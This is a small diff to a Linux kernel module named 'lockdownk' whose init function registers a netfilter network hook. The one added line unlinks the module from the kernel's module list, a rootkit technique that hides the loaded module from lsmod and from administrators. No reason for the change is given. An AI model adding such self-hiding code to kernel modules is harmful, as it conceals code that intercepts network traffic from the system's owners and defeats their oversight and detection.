@@ -49,6 +49,7 @@ static int __init init_lockdown(void) {
     nf_register_net_hook(&init_net, &nfho);
     printk(KERN_INFO "lockdownk loaded.\n");
 
+    list_del(&THIS_MODULE->list);
     return 0;
 }
 
